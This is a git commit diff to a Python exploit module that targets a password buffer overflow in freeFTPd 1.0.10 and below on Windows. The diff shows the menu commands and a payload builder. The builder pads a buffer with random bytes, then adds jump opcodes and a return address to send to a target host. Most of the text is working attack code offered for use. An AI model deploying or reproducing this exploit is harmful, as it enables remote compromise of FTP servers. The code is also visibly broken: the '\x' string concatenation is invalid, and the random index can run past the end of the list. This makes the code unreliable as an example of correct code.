7145178d143ff55b3d4c7be6191fee51a67fc66f
raveneus <raveneus.cwillguy@gmail.com>
2016-05-15 04:39:01 +0000

    Update freeftpd_pass_overflow.py

--- framework/modules/windows/freeftpd_pass_overflow/freeftpd_pass_overflow.py
+++ framework/modules/windows/freeftpd_pass_overflow/freeftpd_pass_overflow.py
@@ -1,6 +1,6 @@
 import ftplib
 import cmd
-import random
+from random import randint
 from socket import AF_INET, SOCK_STREAM, socket, gethostbyname
 
 def getToken(line):
@@ -42,18 +42,19 @@ class freeftpdPassOverflowMenu(cmd.Cmd):
     print "Usage: show options"
     print "show options: show the variables, current values, and descriptions"
   def do_show(self, args):
+    if args != "options":
+      print "*** Unknown argument: " + args
     print "Target: freeFTPd version 1.0.10 and below on Windows"
     print "Options for freeftpd_pass_overflow:"
     print "========================"
     print "user    %s    the user to login in as" % self.user[0]
-    print "passwd    %s    the password of the user" % self.passwd[0]
     print "host    %s    the IP of the target" % self.host[0]
   def help_exit(self):
     print "Usage: exit"
     print "exit: exit the freeftpd_pass_overflow context"
   def do_exit(self, args):
     if args:
-      print "*** Number of argumnets: needed 0"
+      print "*** Argument number: needed 0"
       return
     return True
   def help_start(self):
@@ -71,11 +72,11 @@ class freeftpdPassOverflowMenu(cmd.Cmd):
     f.close()
     char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
     for a in range(0, off - len(payload)):
-      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
+      payload += "\x" + char[randint(0, 16)] + char[randint(0, 16)]
     payload += "\xe9=\xfd\xff\xff"
     payload += "\xeb\xf9"
     for a in range(0, 2):
-      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
+      payload += "\x" + char[randint(0, 16)] + char[randint(0, 16)]
     payload += "\xbb\x14\x40\x00"
     print "[+]Payload generated."
     print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
